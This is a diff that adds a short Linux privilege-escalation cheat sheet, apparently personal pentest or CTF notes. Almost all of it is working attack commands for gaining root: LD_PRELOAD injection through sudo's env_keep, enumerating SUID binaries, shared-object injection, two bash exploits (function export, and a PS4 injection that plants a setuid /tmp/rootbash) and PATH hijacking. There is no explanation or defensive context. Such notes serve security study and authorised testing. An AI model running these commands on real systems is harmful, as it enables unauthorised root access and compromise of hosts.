@@ -1,0 +1,27 @@
+# env_keep+=LD_PRELOAD
+    gcc -fPIC -shared -o ld_preload.so ld_preload.c -nostartfiles
+    sudo LD_PRELOAD=/tmp/ld_preload.so <COMMAND>
+
+# SUID
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    find / -type f -perm -u=s -user root -ls 2>/dev/null
+    find / -type f -perm -u=s -ls 2>/dev/null
+    # Bash
+    cp /bin/bash <FILE>
+    ./<FILE>
+
+    # shared object injection
+    strace <BINARY>
+    gcc -shared -fPIC -o <PATH-SHARED-LIBRARY>.so /tmp/ld_preload.c
+
+    # bash version < 4.2.048
+    function <SUID-BIN-PATH> { /bin/bash -p; }
+    export -f <SUID-BIN-PATH>
+    <SUID-BIN-PATH>
+    
+    # BASH < 4.4
+    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <SUID-BIN-PATH>
+
+# PATH
+    gcc -o exploit /tmp/ld_preload.c
+    export PATH=/tmp:$PATH
